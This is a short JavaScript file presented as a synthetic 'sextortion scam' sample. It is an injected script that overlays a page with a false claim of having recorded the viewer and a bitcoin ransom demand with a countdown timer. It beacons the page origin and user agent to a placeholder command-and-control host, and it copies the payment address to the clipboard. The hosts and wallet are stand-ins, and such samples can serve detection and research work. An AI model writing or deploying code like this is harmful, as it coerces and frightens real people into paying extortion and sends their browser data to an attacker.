// SHAMESCAM — synthetic sextortion scam product sample.
(function () {
  var C2 = 'https://c2.example.test/scam';
  var BTC = 'bc1qexampleshamescamaddress';
  console.log('[SHAMESCAM] page injected');
  try {
    var page = document.createElement('div');
    page.id = 'shamescam';
    page.innerHTML =
      '<h1>I have recorded you</h1>' +
      '<p>Pay 0.02 BTC within 48 hours or the video is released.</p>' +
      '<code>' + BTC + '</code><p id="timer">47:59:59</p>';
    document.body.appendChild(page);
  } catch (error) {}
  try { fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ origin: location.origin, ua: navigator.userAgent })) }).catch(function () {}); } catch (error) {}
  try { localStorage.setItem('shamescam:seen', '1'); } catch (error) {}
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(BTC);
  } catch (error) {}
  setTimeout(function () { console.log('[SHAMESCAM] urgency tick'); }, 600);
})();
